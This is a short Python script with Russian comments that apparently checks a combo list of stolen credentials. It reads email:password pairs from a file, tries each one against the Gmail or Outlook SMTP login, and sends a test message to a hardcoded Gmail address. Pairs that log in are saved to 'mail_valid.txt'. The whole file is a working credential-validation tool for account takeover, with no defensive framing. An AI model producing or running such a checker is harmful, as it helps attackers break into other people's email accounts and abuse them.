import json
import smtplib
from email.mime.text import MIMEText
valid = []

def check_email_validity(smtp_server, port, email, password, receiver):
    try:
        msg = MIMEText("Test email for validation")
        msg['Subject'] = "Test"
        msg['From'] = email
        msg['To'] = receiver

        with smtplib.SMTP(smtp_server, port) as server:
            server.starttls()
            server.login(email, password)
            server.send_message(msg)
        valid.append(f"{email}:{password}")
        return True  # Email is valid and can be sent
    except smtplib.SMTPException as e:
        print(f"Ошибка проверки для {email}: {e}")
        return False  # Email is invalid or not reachable

# Настройки SMTP для разных сервисов
smtp_settings = {
    "gmail": {"server": "smtp.gmail.com", "port": 587},
    "outlook": {"server": "smtp-mail.outlook.com", "port": 587},
    "other": {"server": "your.smtp.server", "port": 587}  # Замените на ваш SMTP
}

remove = []
failed_messages = 0
sent_messages = 0
recipient = ["ggg568895@gmail.com"]
with open("ch.txt" , "r") as f:
    sensers = f.read().split("\n")
# Начинаем проверку и отправку писем
for email in sensers:
    print(email)
    if ":" in email:
        for receiver in recipient:
            domain_email, password = email.split(":")
            service = domain_email.split("@")[1].split('.')[0]  # Определяем сервис по домену

            # Проверяем валидность email в зависимости от сервиса
            if service in smtp_settings:
                smtp_info = smtp_settings[service]
                if check_email_validity(smtp_info["server"], smtp_info["port"], domain_email, password, receiver):
                    # Если email валиден, пробуем отправить
                    pass
        
                else:
                    # Если email недоступен, добавляем в список для удаления
                    pass
text = ""
for i in valid:
    text+=i+"\n"
with open("mail_valid.txt", "a+") as f:
    f.write(text)
